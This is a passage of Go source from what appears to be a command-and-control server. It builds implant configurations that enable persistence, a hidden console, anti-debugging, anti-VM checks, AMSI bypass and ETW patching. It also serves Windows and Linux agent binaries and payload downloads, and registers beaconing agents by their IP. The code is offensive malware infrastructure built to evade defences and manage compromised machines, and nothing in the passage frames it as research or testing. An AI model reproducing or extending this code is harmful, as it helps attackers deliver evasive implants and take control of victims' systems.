		`{"c2_host":%s,"c2_port":%s,"use_tls":%s,"sleep_interval":%s,"jitter":%s,"persistence":%s,"hide_console":%s,"key":%s,"injection_method":%s,"anti_debug":%s,"anti_vm":%s,"sleep_obfuscation":%s,"amsi_bypass":%s,"etw_patch":%s}`,
		esc(cfg.C2Host),
		esc(port),
		esc(tf(cfg.UseTLS)),
		esc(strconv.Itoa(sleep)),
		esc(strconv.Itoa(jit)),
		esc(tf(cfg.Persistence)),
		esc(tf(cfg.HideConsole)),
		esc(cfg.Key),
		esc(inj),
		esc(tf(cfg.AntiDebug)),
		esc(tf(cfg.AntiVM)),
		esc("true"),
		esc("true"),
		esc("true"),
	))
}

func parseInt(s string, defaultVal int) int {
	if s == "" {
		return defaultVal
	}
	val, err := strconv.Atoi(s)
	if err != nil {
		return defaultVal
	}
	return val
}

// isELF checks if a filename suggests an ELF binary
func isELF(filename string) bool {
	// Common Linux binary extensions / no extension
	lower := strings.ToLower(filename)
	return strings.HasSuffix(lower, ".elf") ||
		strings.HasSuffix(lower, ".bin") ||
		strings.HasSuffix(lower, ".out") ||
		!strings.Contains(lower, ".") // no extension often means ELF on Linux
}

// isELFFile reads the first 4 bytes to check for ELF magic
func isELFFile(file io.ReaderAt) bool {
	header := make([]byte, 4)
	n, err := file.ReadAt(header, 0)
	if err != nil || n < 4 {
		return false
	}
	return string(header) == "\x7fELF"
}

func getPayloadHistoryHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		var payloads []PayloadRecord
		err := fileMgr.GetDB().Select(&payloads, `
			SELECT id, filename, size, status, created_at, temp_path, config
			FROM payloads
			ORDER BY created_at DESC
			LIMIT 100
		`)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}
		c.JSON(http.StatusOK, payloads)
	}
}

func downloadPayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		var payload PayloadRecord
		err := fileMgr.GetDB().Get(&payload, "SELECT * FROM payloads WHERE id = ?", id)
		if err != nil {
			c.JSON(http.StatusNotFound, gin.H{"error": "Payload not found"})
			return
		}

		if _, err := os.Stat(payload.TempPath); os.IsNotExist(err) {
			c.JSON(http.StatusNotFound, gin.H{"error": "Payload file not found on disk"})
			return
		}

		c.Header("Content-Description", "File Transfer")
		c.Header("Content-Transfer-Encoding", "binary")
		c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=%s", payload.Filename))
		c.Header("Content-Type", "application/octet-stream")
		c.Header("Content-Length", strconv.FormatInt(payload.Size, 10))
		c.File(payload.TempPath)
	}
}

func deletePayloadHandler(fileMgr *filetransfer.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		id := c.Param("id")
		var payload PayloadRecord
		err := fileMgr.GetDB().Get(&payload, "SELECT * FROM payloads WHERE id = ?", id)
		if err != nil {
			c.JSON(http.StatusNotFound, gin.H{"error": "Payload not found"})
			return
		}

		// Delete file from disk
		os.Remove(payload.TempPath)

		// Delete from database
		_, err = fileMgr.GetDB().Exec("DELETE FROM payloads WHERE id = ?", id)
		if err != nil {
			c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
			return
		}

		c.JSON(http.StatusOK, gin.H{"message": "Payload deleted"})
	}
}

func startAgentPayloadServer(fileMgr *filetransfer.Manager, port int) {
	mux := http.NewServeMux()

	mux.HandleFunc("/payload/", func(w http.ResponseWriter, r *http.Request) {
		fileID := r.URL.Path[len("/payload/"):]
		if fileID == "" {
			http.NotFound(w, r)
			return
		}

		ft, err := fileMgr.Get(fileID)
		if err != nil {
			log.Printf("[Payload] File not found: %s", fileID)
			http.NotFound(w, r)
			return
		}

		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=%s", ft.Filename))
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Length", strconv.FormatInt(ft.Size, 10))
		http.ServeFile(w, r, ft.TempPath)
	})

	log.Printf("[*] Payload server listening on :%d", port)
	http.ListenAndServe(fmt.Sprintf(":%d", port), mux)
}

func ServeAgentBinary(fileMgr *filetransfer.Manager, bindAddr string, binaryPath string) {
	mux := http.NewServeMux()

	mux.HandleFunc("/agent", func(w http.ResponseWriter, r *http.Request) {
		log.Printf("[AgentBinary] Request: %s, Path: %s", r.URL.Path, binaryPath)
		if _, err := os.Stat(binaryPath); os.IsNotExist(err) {
			log.Printf("[AgentBinary] File not found: %s", binaryPath)
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", "attachment; filename=agent.exe")
		http.ServeFile(w, r, binaryPath)
	})

	// Also serve Linux agent at /agent/linux
	linuxPath := filepath.Join(filepath.Dir(binaryPath), "agent_linux")
	mux.HandleFunc("/agent/linux", func(w http.ResponseWriter, r *http.Request) {
		if _, err := os.Stat(linuxPath); os.IsNotExist(err) {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", "attachment; filename=agent_linux")
		http.ServeFile(w, r, linuxPath)
	})

	log.Printf("[*] Agent binary server listening on %s", bindAddr)
	http.ListenAndServe(bindAddr, mux)
}

func agentHTTPBeaconHandler(agentMgr *agent.Manager) gin.HandlerFunc {
	return func(c *gin.Context) {
		if c.Request.Method != http.MethodPost {
			c.JSON(http.StatusMethodNotAllowed, gin.H{"error": "POST required"})
			return
		}

		var reg agent.RegistrationData
		if err := c.ShouldBindJSON(&reg); err != nil {
			log.Printf("[AgentHTTP] Invalid JSON: %v", err)
			c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid JSON body"})
			return
		}

		// Get client IP
		ip := c.ClientIP()
		if ip == "::1" || ip == "127.0.0.1" {
			// Try to get real IP from headers
			if xff := c.GetHeader("X-Forwarded-For"); xff != "" {
				ip = strings.Split(xff, ",")[0]
			} else if xri := c.GetHeader("X-Real-IP"); xri != "" {
				ip = xri
			}
		}

		// Register or reconnect agent
		agt, err := agentMgr.Register(&reg, nil, ip)
		if err != nil {
			log.Printf("[AgentHTTP] Register failed: %v", err)
			c.JSON(http.StatusInternalServerError, gin.H{"error": "Registration failed"})
			return
		}

		log.Printf("[AgentHTTP] Agent registered: %s (%s) from %s", agt.ID, agt.Hostname, ip)

		// Return agent ID and session ID for the agent to use
		c.JSON(http.StatusOK, gin.H{
			"agent_id":   agt.ID,
			"session_id": agt.SessionID,
			"status":     "registered",
		})
	}
}